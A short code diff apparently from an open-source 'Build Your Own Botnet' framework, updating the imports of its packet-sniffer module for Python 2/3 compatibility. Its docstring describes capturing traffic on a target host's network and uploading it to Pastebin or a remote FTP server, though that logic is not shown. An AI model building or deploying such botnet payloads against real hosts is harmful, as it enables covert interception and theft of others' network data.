@@ -3,16 +3,16 @@
 'Packet Sniffer (Build Your Own Botnet)'
 
 # standard libarary
-import os
-import sys
-import imp
 import time
 import struct
 import socket
-import urllib
 import binascii
-import StringIO
 import threading
+
+try:
+    from StringIO import StringIO  # Python 2
+except ImportError:
+    from io import StringIO        # Python 3
 
 # utilities
 import util
@@ -21,10 +21,10 @@ import util
 packages = []
 platforms = ['linux2','darwin']
 results = {}
-log = StringIO.StringIO()
+log = StringIO()
 flag = threading.Event()
 usage  = 'packetsniffer [mode]'
-desription = """ 
+desription = """
 Capture packets on the target client host machine's local network
 and optionally upload them to Pastebin or to a remote FTP server
 """
@@ -169,7 +169,7 @@ def _run():
 
 
 def run():
-    """ 
+    """
     Monitor the host network and capture packets
 
     `Optional`
